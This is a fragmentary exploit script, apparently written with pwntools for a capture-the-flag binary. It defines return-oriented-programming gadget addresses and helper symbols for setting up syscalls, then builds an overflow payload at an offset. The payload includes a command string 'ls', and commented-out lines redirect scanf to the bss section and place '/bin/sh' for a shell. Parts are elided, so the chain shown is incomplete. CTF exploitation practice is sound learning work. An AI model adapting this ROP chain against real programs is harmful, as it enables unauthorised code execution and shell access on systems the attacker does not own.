...
POP_RSI = 0x00000000004011f9 # POP RSI ; POP r15 ; ret
POP_RDI = 0x00000000004011fb # pop rdi ; ret
syscall = elf.sym.b
rax_plus_one = elf.sym.g
xor_rdx = elf.sym.c
xor_rcx = elf.sym.h
xor_rax = elf.sym.d
rax_eq_64 = elf.sym.e
rax_minus_6 = elf.sym.f
...
payload = flat({offset: [
  ...
  b"ls".ljust(8, b"\x00"),
  # p64(0x00401020),
  # p64(0x000000000040103b),
  
  
  # p64(elf.bss()),
  # p64(elf.sym.a),

  # # # Second redirect bss+8
  # p64(elf.sym["__isoc99_scanf"]),
  # p64(elf.bss() + 8),
  # b"/bin/sh\x00",
  # p64(xor_rax),
  # p64(xor_rcx),
